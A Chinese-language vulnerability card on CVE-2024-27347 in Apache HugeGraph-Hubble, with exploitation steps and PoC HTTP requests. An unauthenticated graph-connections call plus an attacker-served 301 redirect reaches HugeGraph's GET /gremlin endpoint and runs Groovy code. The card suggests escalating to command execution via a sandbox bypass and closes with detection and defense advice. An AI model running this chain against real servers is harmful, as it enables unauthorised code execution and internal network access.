---
id: web-java-component-hugegraph-hubble-graph-connections-redirect-ssrf-gremlin
title: HugeGraph-Hubble 图连接 SSRF 链：/versions 跟随 30x 重定向到 HugeGraph GET /gremlin，无图信息也能执行 Gremlin（CVE-2024-27347）
type: scenario
domain: web
path: web/java/component
technique: hugegraph-hubble-graph-connections-jersey-redirect-ssrf-gremlin
tags:
- java
- hugegraph
- hubble
- ssrf
- redirect
- jersey
- gremlin
- rce
cve:
- CVE-2024-27347
severity: critical
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
affected_versions: Apache HugeGraph-Hubble 1.0.0 至 <1.3.0（原文标记 from 1.0.0 before 1.3.0）
verification:
  verified_by: verifier-V411
  verified_at: '2026-11-09T14:58:49+08:00'
  notes: 已对照原文与20张截图核对：VersionAPI#get 的 JerseyWebTarget 指向 http://127.0.0.1:8080（图13）、客户端默认跟随30x、mockoon 返回 301 Location 到 /gremlin?gremlin=...（图16）、graph-connections host 172.27.64.1:3000 的响应 400 中带出 System.getProperties() 全部属性（图17）均属实；affected_versions 按原文 Hubble from 1.0.0 before 1.3.0 保留。重要关联核验：既有卡 binary-pwn-sandbox-escape-hugegraph-gremlin-threadname-securitymanager-bypass 的线程名方向写反——图03 checkExec 仅在 callFromGremlin() 为 true 时抛异常，图07 callFromWorkerWithClass 要求线程名 startsWith(GREMLIN_SERVER_WORKER="gremlin-server-exec")/"task-worker" 且栈含 GremlinGroovyScriptEngine（图06/08）才返回 true，图05 checkPermission 同一条件；故改名为 gremlin-server-exec 恰会触发拦截，原文利用载荷改名为 "evil" 使 callFromGremlin 返回 false 才绕过；该既有卡需修正标题/原理/步骤/PoC（改为非匹配线程名），本会话不直接改。未验证点：PoC 未执行；命令执行需再接沙箱绕过载荷。
url: /docs/web/java/component/web-java-component-hugegraph-hubble-graph-connections-redirect-ssrf-gremlin/
draft: false
kb_aliases:
- CVE-2024-27347
- HugeGraph-Hubble SSRF
- graph-connections SSRF
- JerseyWebTarget 跟随重定向
- Hubble 未授权
- Gremlin GET 接口
---

## 一句话结论

HugeGraph-Hubble 管理台默认无需登录，其 `/api/v1.2/graph-connections` 会按请求里的 host/port 建立图连接并先对目标发 `GET /versions`；Hubble 使用的 Jersey 客户端默认跟随 `30x` 重定向，攻击者让该请求落到自己的服务器并返回 `301 Location: http://<hugegraph>:8080/gremlin?gremlin=<payload>`，就能让 Hubble 以 SSRF 方式调用 HugeGraph 的 GET Gremlin 接口执行任意 Groovy 代码——即使目标不存在已知图、无法通过 graph 名称校验也能打通（CVE-2024-27347）。

## 原理

- **Hubble 面**：Hubble 是 HugeGraph 的在线管理与分析仪表板（工具链子模块），默认不要求账号密码；`/api/v1.2/graph-connections` 接收 `host`/`port`/`graph`，服务端据此创建到 HugeGraph 的连接。
- **连接建立即 SSRF**：`org.apache.hugegraph.api.version.VersionAPI#get` 调 `this.client.get(this.path())`（Jersey `JerseyWebTarget`），目标 URL 由用户提交的 host/port 拼出；Jersey 客户端默认跟随 `30X` 重定向，于是可把“固定的 GET /versions”变成“路由与参数均可控的 GET 请求”。
- **重定向到 Gremlin**：HugeGraph-Server 提供 GET 形式的 `/gremlin?gremlin=<script>` 接口（`getRawQuery` 取原始查询并转发），攻击者在恶意服务器返回 301，Location 指向该接口并携带 Groovy 载荷，Hubble 自动跟随并执行。
- **无图也能打**：正常情况下若不能确定目标 graph 名，graph-connections 会在“图是否存在”处失败；SSRF 分支绕过该逻辑，直接命中 HugeGraph 的 Gremlin 接口。
- **回显**：Hubble 把 Gremlin 响应按 `Versions` 反序列化，失败异常里带出原始响应内容（示例为 `System.getProperties()` 的系统属性），证明脚本已执行；实际利用可换成命令执行链（如 CVE-2024-27348 的沙箱绕过）。
- 版本：Hubble from 1.0.0 before 1.3.0。

## 触发条件

- Hubble 管理台可从攻击者网络访问（默认 8088），且未开启认证。
- Hubble 能访问内网 HugeGraph-Server（默认 8080），Server 未开启鉴权或 Gremlin GET 接口可达。
- 攻击者能提供一个返回 30x 的 HTTP 服务（mockoon/自建均可），并让 Hubble 连到它（host/port 可控）。
- 目标 HugeGraph 版本允许 Gremlin 脚本执行（默认）。

## 利用步骤

1. 发现 Hubble（如 `http://target:8088`），确认无需登录即可访问图管理/连接接口。
2. 在攻击者主机 `3000` 端口起 HTTP 服务：对任意 `GET /versions` 返回 `301`，`Location: http://<hugegraph-host>:8080/gremlin?gremlin=<URL编码的 Groovy 载荷>`。
3. 向 Hubble 发送 `POST /api/v1.2/graph-connections`，body 中 `host` 指向攻击者主机、`port` 为 3000、`graph` 任意（如 `aa`）。
4. Hubble 发出 `GET /versions` → 被 301 引导到 HugeGraph 的 GET `/gremlin`，Groovy 脚本执行。
5. 观察响应中的反序列化错误/回显（如系统属性、DNS 日志），确认代码执行；把载荷换成命令执行（`Runtime.exec`/`ProcessImpl` + 线程名绕过）。
6. 也可将 Location 指向内网其他 GET 接口，把该 SSRF 用于探测/操作其他内部 Web 服务。

## PoC

```http
POST /api/v1.2/graph-connections HTTP/1.1
Host: <hubble>:8088
Content-Type: application/json;charset=UTF-8

{"name":"bb","graph":"aa","host":"<attacker>","port":"3000","username":"44","password":"44"}
```

```http
HTTP/1.1 301 Moved Permanently
Location: http://<hugegraph>:8080/gremlin?gremlin=System.getProperties()%3B
```

```text
# 回显（反序列化异常中带出）
Failed to deserialize ... {"java.version":"11", "os.name":"Linux", "user.dir":"/tools/apache-hugegraph-incubating-1.0.0", ...}
```

## 变体与关联

- 变体：Location 指向任意内网 GET 接口（路由/参数可控 SSRF）；301 之外的 302/303/307 同样可试；结合 DNS rebinding 或内网主机名枚举扩大目标。
- 关联：CVE-2024-27348 的 Gremlin 沙箱绕过（[[binary-pwn-sandbox-escape-hugegraph-gremlin-threadname-securitymanager-bypass]]）是 SSRF 之后的 RCE 载荷；与 [[web-generic-ssrf-redirect-gopher-localhost-portscan-omi]] 同属“跟随重定向的 SSRF 组合”但协议与目标不同；与 [[web-generic-ssrf-ai-inference-model-param-url-ssrf]] 等 URL 参数 SSRF 的区别是入口为管理端的图连接配置。
- 边界：原文用 `System.getProperties()` 证明代码执行；完整命令执行需再接沙箱绕过载荷。

## 检测与防御

- 检测：Hubble 对非常规 host/port 发起 `/versions`；HTTP 客户端跟随 30x 到 HugeGraph `/gremlin`；Gremlin GET 请求出现在非 UI 调用路径；异常响应中出现系统属性/类路径等敏感信息；Hubble 无认证暴露在非受信网络。
- 防御：升级 Hubble/Server 到 1.3.0+；为 Hubble 开启认证并限制访问来源；图连接目标做白名单与内网地址校验；禁用 Jersey 客户端自动跟随重定向或限制跳转目标；HugeGraph 开启鉴权、禁用不必要的 Gremin 脚本/GET 接口；限制 Hubble 出网。
